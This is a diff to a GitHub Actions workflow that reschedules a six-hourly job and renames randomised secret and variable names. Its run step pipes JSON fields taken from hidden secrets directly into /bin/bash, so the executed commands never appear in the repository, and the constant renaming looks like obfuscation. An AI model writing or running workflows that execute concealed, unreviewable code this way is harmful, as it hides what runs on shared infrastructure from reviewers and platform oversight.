@@ -3,7 +3,7 @@ name: gaozhongzzx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 5/6 * * *'
+    - cron: '52 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,12 +11,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: gaozhongzzx
         env:
-          yvznw29: ${{ secrets.yvznw29 }}
+          bmzby223: ${{ secrets.bmzby223 }}
         run: |
-          echo $yvznw29 | jq -r .zeq510 | /bin/bash
-          echo $r7623 | jq -r .k9 | /bin/bash
-          echo $adjz0 | jq -r .ccmu539 | /bin/bash
-          echo $lgl7 | jq -r .ovq7877 | /bin/bash
-          echo $grid617 | jq -r .lks76 | /bin/bash
-          echo $rsp0324 | jq -r .dbgwx6713 | /bin/bash
+          echo $bmzby223 | jq -r .qc86193 | /bin/bash
+          echo $r5 | jq -r .l5015 | /bin/bash
+          echo $doarx3 | jq -r .nv59 | /bin/bash
+          echo $wvvc49 | jq -r .mli648 | /bin/bash
+          echo $tyq5 | jq -r .tmw5 | /bin/bash
+          echo $o5426 | jq -r .hwt3 | /bin/bash
 
